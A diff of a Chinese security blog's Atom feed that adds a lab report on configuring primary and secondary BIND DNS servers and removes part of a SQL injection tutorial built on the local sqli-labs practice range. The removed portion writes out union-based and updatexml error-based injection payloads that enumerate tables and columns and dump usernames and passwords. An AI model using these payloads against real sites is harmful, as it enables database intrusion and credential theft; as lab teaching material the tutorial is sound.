@@ -8,13 +8,115 @@
     <author>
       <name>Clown</name>
     </author>
-    <updated>2022-11-01T16:00:00.000Z</updated>
+    <updated>2022-11-02T16:00:00.000Z</updated>
     <category term="Clown" />
     <category term="Web" />
     <category term="Pwn" />
     <category term="CTF" />
     <category term="AWD" />
     <category term="ACM" />
+    <entry>
+        <id>https://blog.xcu.icu/2022/11/03/DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/</id>
+        <title>DNS服务器</title>
+        <link rel="alternate" href="https://blog.xcu.icu/2022/11/03/DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/"/>
+        <content type="html">&lt;h2 id=&#34;实验3：DNS服务器配置&#34;&gt;&lt;a href=&#34;#实验3：DNS服务器配置&#34; class=&#34;headerlink&#34; title=&#34;实验3：DNS服务器配置&#34;&gt;&lt;/a&gt;实验3：DNS服务器配置&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;实验目的&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;1、了解DNS 基本概念及域名解析过程；&lt;/p&gt;
+&lt;p&gt;2、熟悉常规DNS服务器的安装与配置；&lt;/p&gt;
+&lt;p&gt;3、掌握辅助DNS服务器的配置；&lt;/p&gt;
+&lt;p&gt;4、掌握DNS服务器配置过程中一般排错方法。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;实验参考&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;实验步骤可参考《5-1-主dns服务器配置.pdf》文件。&lt;/p&gt;
+&lt;p&gt;实验步骤可参考《5-2-辅助DNS服务器配置.pdf》文件。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;1-实验要求&#34;&gt;&lt;a href=&#34;#1-实验要求&#34; class=&#34;headerlink&#34; title=&#34;1.实验要求&#34;&gt;&lt;/a&gt;1.实验要求&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;任务1：主DNS服务器配置 &lt;/p&gt;
+&lt;p&gt;任务2：辅助DNS服务器配置&lt;/p&gt;
+&lt;p&gt;要求：域名为xxx.co，其中xxx为姓名拼音拼写。   &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;2-实验过程&#34;&gt;&lt;a href=&#34;#2-实验过程&#34; class=&#34;headerlink&#34; title=&#34;2.实验过程&#34;&gt;&lt;/a&gt;2.实验过程&lt;/h3&gt;&lt;h4 id=&#34;2-1-主DNS服务器配置&#34;&gt;&lt;a href=&#34;#2-1-主DNS服务器配置&#34; class=&#34;headerlink&#34; title=&#34;2.1 主DNS服务器配置&#34;&gt;&lt;/a&gt;2.1 主DNS服务器配置&lt;/h4&gt;&lt;h5 id=&#34;2-1-1-环境准备&#34;&gt;&lt;a href=&#34;#2-1-1-环境准备&#34; class=&#34;headerlink&#34; title=&#34;2.1.1 环境准备&#34;&gt;&lt;/a&gt;2.1.1 环境准备&lt;/h5&gt;&lt;p&gt;安装服务软件包&lt;/p&gt;
+&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;# yum install -y bind bind-chroot bind-utils&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103144721267.png&#34; alt=&#34;image-20221103144721267&#34;&gt;&lt;/p&gt;
+&lt;h5 id=&#34;2-1-2-修改4个配置文件&#34;&gt;&lt;a href=&#34;#2-1-2-修改4个配置文件&#34; class=&#34;headerlink&#34; title=&#34;2.1.2 修改4个配置文件&#34;&gt;&lt;/a&gt;2.1.2 修改4个配置文件&lt;/h5&gt;&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;修改主配置文件，主要更改三个位置如下图&lt;/p&gt;
+&lt;p&gt;开头位置&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103145538563.png&#34; alt=&#34;image-20221103145538563&#34;&gt;&lt;/p&gt;
+&lt;p&gt;结尾位置&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103145737581.png&#34; alt=&#34;image-20221103145737581&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;修改区域配置文件（复制原有的样本文件）&lt;/p&gt;
+&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;#cp -p &amp;#x2F;etc&amp;#x2F;named.rfc1912.zones &amp;#x2F;etc&amp;#x2F;named.lq.zone
+#这里-p是为了保持权限一致&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103150314623.png&#34; alt=&#34;image-20221103150314623&#34;&gt;&lt;/p&gt;
+&lt;p&gt;修改区域文件，保留正向区域和反向区域引入部分&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103151036445.png&#34; alt=&#34;image-20221103151036445&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;修改正向解析文件（记录域名和ip地址的对应关系）&lt;/p&gt;
+&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;#cp -p &amp;#x2F;var&amp;#x2F;named&amp;#x2F;named.localhost &amp;#x2F;var&amp;#x2F;named&amp;#x2F;named.lq.co&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103152432683.png&#34; alt=&#34;image-20221103152432683&#34;&gt;&lt;/p&gt;
+&lt;p&gt;修改解析文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103153833142.png&#34; alt=&#34;image-20221103153833142&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;修改反向解析文件&lt;/p&gt;
+&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;#cp -p &amp;#x2F;var&amp;#x2F;named&amp;#x2F;named.loopback &amp;#x2F;var&amp;#x2F;named&amp;#x2F;named.lq.loopback&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103152946305.png&#34; alt=&#34;image-20221103152946305&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103153720430.png&#34; alt=&#34;image-20221103153720430&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;开启服务&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103154120053.png&#34; alt=&#34;image-20221103154120053&#34;&gt;&lt;/p&gt;
+&lt;h5 id=&#34;2-1-3测试&#34;&gt;&lt;a href=&#34;#2-1-3测试&#34; class=&#34;headerlink&#34; title=&#34;2.1.3测试&#34;&gt;&lt;/a&gt;2.1.3测试&lt;/h5&gt;&lt;p&gt;先在测试机安装工具包&lt;/p&gt;
+&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;#sudo yum install -y bind-utils&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103160707160.png&#34; alt=&#34;image-20221103160707160&#34;&gt;&lt;/p&gt;
+&lt;p&gt;修改静态DNS&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103161100819.png&#34; alt=&#34;image-20221103161100819&#34;&gt;&lt;/p&gt;
+&lt;p&gt;进入nslookup的交互模式&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103161253757.png&#34; alt=&#34;image-20221103161253757&#34;&gt;&lt;/p&gt;
+&lt;p&gt;超时报错，测试寻找问题&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103161404203.png&#34; alt=&#34;image-20221103161404203&#34;&gt;&lt;/p&gt;
+&lt;p&gt;测试主机可达，测试防火墙的问题&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103161505377.png&#34; alt=&#34;image-20221103161505377&#34;&gt;&lt;/p&gt;
+&lt;p&gt;关闭防火墙，能正常解析&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103161646400.png&#34; alt=&#34;image-20221103161646400&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里是防火墙策略设置问题&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103161959246.png&#34; alt=&#34;image-20221103161959246&#34;&gt;&lt;/p&gt;
+&lt;p&gt;将DNS服务加入防火墙设置策略中，再进行测试&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103162110067.png&#34; alt=&#34;image-20221103162110067&#34;&gt;&lt;/p&gt;
+&lt;p&gt;使用dig命令测试&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103162313264.png&#34; alt=&#34;image-20221103162313264&#34;&gt;&lt;/p&gt;
+&lt;p&gt;反向解析&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103162349247.png&#34; alt=&#34;image-20221103162349247&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;2-2-辅助DNS服务器配置&#34;&gt;&lt;a href=&#34;#2-2-辅助DNS服务器配置&#34; class=&#34;headerlink&#34; title=&#34;2.2 辅助DNS服务器配置&#34;&gt;&lt;/a&gt;2.2 辅助DNS服务器配置&lt;/h4&gt;&lt;h5 id=&#34;2-2-1-主DNS服务器的修改&#34;&gt;&lt;a href=&#34;#2-2-1-主DNS服务器的修改&#34; class=&#34;headerlink&#34; title=&#34;2.2.1 主DNS服务器的修改&#34;&gt;&lt;/a&gt;2.2.1 主DNS服务器的修改&lt;/h5&gt;&lt;p&gt;修改主配置文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103162803420.png&#34; alt=&#34;image-20221103162803420&#34;&gt;&lt;/p&gt;
+&lt;p&gt;修改主解析文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103163107221.png&#34; alt=&#34;image-20221103163107221&#34;&gt;&lt;/p&gt;
+&lt;p&gt;修改反向解析文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103163256050.png&#34; alt=&#34;image-20221103163256050&#34;&gt;&lt;/p&gt;
+&lt;p&gt;重启服务&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103163349204.png&#34; alt=&#34;image-20221103163349204&#34;&gt;&lt;/p&gt;
+&lt;h5 id=&#34;2-2-2-辅助DNS服务器的修改&#34;&gt;&lt;a href=&#34;#2-2-2-辅助DNS服务器的修改&#34; class=&#34;headerlink&#34; title=&#34;2.2.2 辅助DNS服务器的修改&#34;&gt;&lt;/a&gt;2.2.2 辅助DNS服务器的修改&lt;/h5&gt;&lt;p&gt;修改主配置文件（和主DNS一样）&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103164025601.png&#34; alt=&#34;image-20221103164025601&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103164042746.png&#34; alt=&#34;image-20221103164042746&#34;&gt;&lt;/p&gt;
+&lt;p&gt;配置区域文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103165149281.png&#34; alt=&#34;image-20221103165149281&#34;&gt;&lt;/p&gt;
+&lt;h5 id=&#34;2-2-3测试&#34;&gt;&lt;a href=&#34;#2-2-3测试&#34; class=&#34;headerlink&#34; title=&#34;2.2.3测试&#34;&gt;&lt;/a&gt;2.2.3测试&lt;/h5&gt;&lt;p&gt;辅助dns&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103171115638.png&#34; alt=&#34;image-20221103171115638&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Linux客户端&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103171236892.png&#34; alt=&#34;image-20221103171236892&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103171227238.png&#34; alt=&#34;image-20221103171227238&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;3-实验小结&#34;&gt;&lt;a href=&#34;#3-实验小结&#34; class=&#34;headerlink&#34; title=&#34;3.实验小结&#34;&gt;&lt;/a&gt;3.实验小结&lt;/h3&gt;&lt;p&gt;本次实验主要实践了DNS服务器的配置，复习了dig的使用，学会了nslookup的使用&lt;/p&gt;
+</content>
+        <category term="网络服务应用" scheme="https://blog.xcu.icu/categories/%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%BA%94%E7%94%A8/" />
+        <category term="DNS服务器" scheme="https://blog.xcu.icu/tags/DNS%E6%9C%8D%E5%8A%A1%E5%99%A8/" />
+        <updated>2022-11-02T16:00:00.000Z</updated>
+    </entry>
     <entry>
         <id>https://blog.xcu.icu/2022/11/02/php%E5%BA%8F%E5%88%97%E5%8C%96/</id>
         <title>php反序列化</title>
@@ -5417,321 +5519,6 @@ if(isset($_POST[&amp;#39;submit&amp;#39;]))
 &lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314215829385-1373901654.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;这里因为有报错也可以用报错注入&lt;/p&gt;
 &lt;p&gt;到这里进阶篇就结束了&lt;/p&gt;
-</content>
-        <category term="Web" scheme="https://blog.xcu.icu/categories/Web/" />
-        <category term="SQL注入" scheme="https://blog.xcu.icu/tags/SQL%E6%B3%A8%E5%85%A5/" />
-        <updated>2022-09-22T16:00:00.000Z</updated>
-    </entry>
-    <entry>
-        <id>https://blog.xcu.icu/2022/09/23/%E5%9F%BA%E4%BA%8Esqli-labs%E7%9A%84%E5%9F%BA%E7%A1%80%E7%AF%87/</id>
-        <title>基于sqli-labs前20关的SQL注入学习</title>
-        <link rel="alternate" href="https://blog.xcu.icu/2022/09/23/%E5%9F%BA%E4%BA%8Esqli-labs%E7%9A%84%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
-        <content type="html">&lt;h1 id=&#34;sql注入基础篇&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入基础篇&#34;&gt;#&lt;/a&gt; SQL 注入基础篇&lt;/h1&gt;
-&lt;h2 id=&#34;一-sql简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-sql简介&#34;&gt;#&lt;/a&gt; 一、SQL 简介&lt;/h2&gt;
-&lt;h2 id=&#34;sql是一种查询语言是一种访问和处理数据库包括数据插入-查询-更新和删除&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql是一种查询语言是一种访问和处理数据库包括数据插入-查询-更新和删除&#34;&gt;#&lt;/a&gt; SQL 是一种查询语言，是一种访问和处理数据库，包括数据插入、查询、更新和删除。&lt;/h2&gt;
-&lt;p&gt;&lt;strong&gt;具体功能总结如下&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;可以对数据库进行查询并取得数据❗&lt;/li&gt;
-&lt;li&gt;可以向数据库插入或删除记录❗&lt;/li&gt;
-&lt;li&gt;可以建立数据库，表❗&lt;/li&gt;
-&lt;li&gt;可以设置表，储存过程和视图的权限❗&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;1&amp;quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;web_sqli&#39;)),0x7e),1)#&lt;/p&gt;
-&lt;h1 id=&#34;示例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#示例&#34;&gt;#&lt;/a&gt; 示例&lt;/h1&gt;
-&lt;h3 id=&#34;基于sqli-labs靶场&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于sqli-labs靶场&#34;&gt;#&lt;/a&gt; (基于 sqli-labs 靶场)&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzEyODcxNTM2NDM=&#34;&gt;#&lt;/span&gt;&lt;/h3&gt;
-&lt;p&gt;&lt;strong&gt;先了解几个简单的语句&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;version（）：查看数据库版本&lt;/li&gt;
-&lt;li&gt;user（）：查看当前用户&lt;/li&gt;
-&lt;li&gt;database（）：查看使用的数据库&lt;/li&gt;
-&lt;li&gt;group_concat（）：一次性获取数据库信息&lt;/li&gt;
-&lt;li&gt;select 字段名 from 表名&lt;/li&gt;
-&lt;li&gt;select 的后面表示筛选的内容，from 的后面表示筛选内容来自的位置，where 的后面表示筛选的条件&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;1-4关基于错误的字符串数字型注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-4关基于错误的字符串数字型注入&#34;&gt;#&lt;/a&gt; 1-4 关基于错误的字符串 / 数字型注入&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzM1ODA5MTUzMTk=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;h1 id=&#34;img&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#img&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314175958063-396558717.png&#34; alt=&#34;img&#34; /&gt;&lt;/h1&gt;
-&lt;p&gt;&lt;strong&gt;根据要求看出需要构建一个 id 参数值&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;首先判断是否为数字型注入，像这样输入回显正常&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtMS8/aWQ9MQ==&#34;&gt;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&lt;/span&gt;&lt;br /&gt;
-&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314180021405-1217770395.png&#34; alt=&#34;img&#34; /&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;将后面的？id=1 改为？id=1 and 1=1--+ 和？id=1 and 1=2--+ 发现回显都正常&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;于是判断一下是否为字符型注入，这里改变一下闭合的符号&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;像这样输入会报错&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtMS8/aWQ9MQ==&#34;&gt;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&lt;/span&gt;&#39;&lt;br /&gt;
-&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314180026767-94242277.png&#34; alt=&#34;img&#34; /&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;把报错拿出来分析&lt;/strong&gt;&lt;/p&gt;
-&lt;h1 id=&#34;ctf赛题没有报错这里只是靶场练习&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ctf赛题没有报错这里只是靶场练习&#34;&gt;#&lt;/a&gt; &lt;em&gt;&lt;em&gt;&lt;em&gt;*&lt;/em&gt;**ctf 赛题没有报错，这里只是靶场练习 ***&lt;/em&gt;*&lt;/em&gt;*&lt;/h1&gt;
-&lt;p&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1&lt;/p&gt;
-&lt;p&gt;&#39;&#39;1&#39;&#39; LIMIT 0,1&#39; 这两个单引号包含部分就是报错部分&lt;/p&gt;
-&lt;p&gt;&#39;1&#39; 是数据库中的完整部分，后面多个引号也是在说明属于字符型注入&lt;/p&gt;
-&lt;p&gt;像上面一样，将后面的？id=1 改为？id=1 and 1=1--+ 和？id=1 and 1=2--+ 发现 1=1 时正常回显而 1=2 时没有回显&lt;/p&gt;
-&lt;p&gt;然后使用 order by 来确定表中的列数，为什么要确定表中字段的列数呢？是因为 union 联合查询的特点&lt;/p&gt;
-&lt;p&gt;union 联合查询特点&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;要求多条查询语句的查询列数是一致的&lt;/li&gt;
-&lt;li&gt;要求多条查询语句的查询的每一列的类型和顺序最好一致&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;strong&gt;于是构造&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;?id=1&#39; order by 1--+　　页面回显正常&lt;/li&gt;
-&lt;li&gt;?id=1&#39; order by 2--+　　页面回显正常&lt;/li&gt;
-&lt;li&gt;?id=1&#39; order by 3--+　　页面回显正常&lt;/li&gt;
-&lt;li&gt;?id=1&#39; order by 4--+　　出现报错界面&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;篇幅问题我只展示了 order by 4 的报错这个&lt;/p&gt;
-&lt;h1 id=&#34;img-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#img-2&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314180044871-999577020.png&#34; alt=&#34;img&#34; /&gt;&lt;/h1&gt;
-&lt;p&gt;然后就确定了字段数，于是用联合查询&lt;/p&gt;
-&lt;p&gt;[&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtMS8/aWQ9LTE=&#34;&gt;http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&lt;/span&gt;&#39; union select 1,2,3 --+](&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtMS8/aWQ9LTE=&#34;&gt;http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&lt;/span&gt;&#39; union select 1,2,3  --+)&lt;/p&gt;
-&lt;p&gt;(将 id 弄成一个负数的值或者是 0，使前面的语句失效) 然后看看 union 查询是否有回显位&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314180055404-1406981305.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这样就看到了 2，3 这两个回显位&lt;/p&gt;
-&lt;p&gt;然后利用 union 查询，查看数据库的版本和数据库名，这里面再补充点知识点&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;version (): 查看数据库版本&lt;/li&gt;
-&lt;li&gt;database (): 查看使用的数据库&lt;/li&gt;
-&lt;li&gt;user (): 查看当前用户&lt;/li&gt;
-&lt;li&gt;limit:limit 子句分批来获取所有数据&lt;/li&gt;
-&lt;li&gt;group_concat (): 一次性获取所有的数据库信息&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;接着利用回显位查询数据库和数据库版本信息&lt;/p&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtMS8/aWQ9LTE=&#34;&gt;http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&lt;/span&gt;&#39; union select 1,version(),database() --+&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314180102576-1024296278.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;下一步爆表&lt;/p&gt;
-&lt;p&gt;再爆表之前先了解一波知识点：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;information_schema.tables: 包含了数据库里所有的表&lt;/li&gt;
-&lt;li&gt;table_name: 表名&lt;/li&gt;
-&lt;li&gt;table_schema: 数据库名&lt;/li&gt;
-&lt;li&gt;column_name: 字段名&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;开始爆表&lt;/p&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtMS8/aWQ9LTE=&#34;&gt;http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&lt;/span&gt;&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),database() --+&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314180107430-909707208.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;查看 users 这个表上的字段名&lt;/p&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtMS8/aWQ9LTE=&#34;&gt;http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&lt;/span&gt;&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),database() --+&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314180113978-662185195.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;然后从 username 和 passwor 字段上获得信息&lt;/p&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtMS8/aWQ9LTE=&#34;&gt;http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&lt;/span&gt;&#39; union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users) --+&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314180120428-1817213673.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;以上是第一关的教程&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;第二关属于数字型注入，开始判断的过程没有那个单引号？id=1 就可以，后面的步骤相同&lt;/p&gt;
-&lt;p&gt;第三关在第一关的基础上加了一个右括号？id=1&#39;) 即可&lt;/p&gt;
-&lt;p&gt;第四关在第三关的基础上将 &#39; 改为 &amp;quot;？id=&amp;quot;) 即可&lt;/p&gt;
-&lt;h1 id=&#34;第五六关&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第五六关&#34;&gt;#&lt;/a&gt; 第五 — 六关&lt;/h1&gt;
-&lt;p&gt;关于获取字段的小技巧：我们从后台源码中，一般只要看到 select * from 表名，一般是要猜这个表里的所有字段，然后进行注入，如果是 select username,password from 表名，这种形式的可以直接利用 2 个字段，作为语句的注入字段。&lt;/p&gt;
